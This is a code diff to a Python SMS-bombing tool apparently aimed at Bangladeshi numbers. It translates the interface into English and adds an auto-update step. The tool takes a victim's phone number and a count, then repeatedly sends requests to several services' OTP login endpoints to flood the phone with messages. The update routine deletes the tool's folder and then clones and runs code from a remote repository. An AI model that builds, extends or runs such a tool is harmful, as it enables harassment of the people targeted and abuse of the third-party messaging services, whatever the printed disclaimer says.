@@ -47,24 +47,28 @@ end = '\033[0m'
 purple="\033[0;35m"
 
 logo=(green+"""
- _______    _______    _______   
-(  ____ \  (       )  (  ____ \  
-| (    \/  | () () |  | (    \/  
-| (_____   | || || |  | (_____   
-(_____  )  | |(_)| |  (_____  )  
-      ) |  | |   | |        ) |  
-/\____) |  | )   ( |  /\____) |  
-\_______)  |/     \|  \_______)""")
+
+ ______   ______     _______  _______  _______ 
+(  ___ \ (  __  \   (  ____ \(       )(  ____ \
+| (   ) )| (  \  )  | (    \/| () () || (    \/
+| (__/ / | |   ) |  | (_____ | || || || (_____ 
+|  __ (  | |   | |  (_____  )| |(_)| |(_____  )
+| (  \ \ | |   ) |        ) || |   | |      ) |
+| )___) )| (__/  )  /\____) || )   ( |/\____) |
+|/ \___/ (______/   \_______)|/     \|\_______)
+                                               
+                                               
+""")
  
 
-line=(yellow+"######################################################")
-tversion=(cyan+"\t\t     টুলস Varson : ০.০১ ")
+line=(yellow+"======================================================")
+tversion=(cyan+"\t\t     Version : 1.0.2 ")
 
 line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
  
-dtls=(yellow+"\t\t Powered By : Nahid Hasan Pranto\n \t\tMessenger:- m.me/nahid.netrakona")
+dtls=(yellow+"\t\t₵ⱤɆ₳₮ɆĐ ฿Ɏ: ₥Đ ₦4Ⱨ1Đ Ⱨ4₴1Đ \n \t\tm.me/nahid.netrakona\n \t\thttps://github.com/N4H1D")
 
-note=(red+"Note:কোনো বেআইনি কার্যকলাপের জন্য না ")
+note=(red+"Note: I wont be responsible fo any illigal activites.")
 
 print(logo)
 
@@ -80,13 +84,53 @@ print(note)
 
 print(line)
 
-print(lightblue+'\t\t [১×৫ +-] 1 লিখলে ৫ টা SMS যাবে')
+
+
+print(green+"\t\t[•]Checking For Updates...")
+
+version = open(".version.txt", "r")
+
+mainversion = requests.get("https://raw.githubusercontent.com/N4H1D/SMS/main/.version.txt")
+
+time.sleep(0.6)
+
+if(version.read() == mainversion.text):
+
+	print(cyan+"You are using the latest version of BD SMS")
+
+else:
+
+	print(' ')
+	print(' ')
+	print(red+"\t\t[✓]Tool Update Found")
+
+	print(blue+"\t\tUpdating Tool...")
+
+	os.system("cd .. && rm -rf SMS && git clone https://github.com/N4H1D/SMS > /dev/null 2>&1 && cd SMS && python SMS.py")
+
+os.system("clear")	
+
+print(logo)
+
+print(" ")
+
+print(dtls)
+
+print(tversion)
+
+print(line)
+
+print(note)
+
+print(line)
+
+print(lightblue+'\t\t If You Type [1] Sand it 5 SMS')
 
 
 print(' ')
 
-number=str(input(red+"[➙] মোবাইল নাম্বার [Ex: 019********] : "))
-amount=int(input(cyan+"[➙] কতটি পাঠাবেন : "))
+number=str(input(red+"[➙] Enter Your Number [Ex: 019********] "))
+amount=int(input(cyan+"[➙] Enter The Amount : "))
 
 url1 = "https://ss.binge.buzz/otp/send/login"
 
@@ -133,9 +177,9 @@ for i in range (amount):
 	resp4 = requests.post(url4, headers=headers4,data=data4)
 	resp5 = requests.post(url5, headers=headers5, data=data5)
 	resp = requests.post(url6, headers=headers6, data=data6)	
-	print(str(i+1)+green+'.	➙Done ')
+	print(str(i+1)+green+'.	➙SMS Sent ✅')
 	
 print('					')
-print(cyan+'\t\tThanks For Using BOMB')
+print(cyan+'\t\tThanks For Using BD SMS ')
 
 os.system("xdg-open https://t.me/AutoganBD")
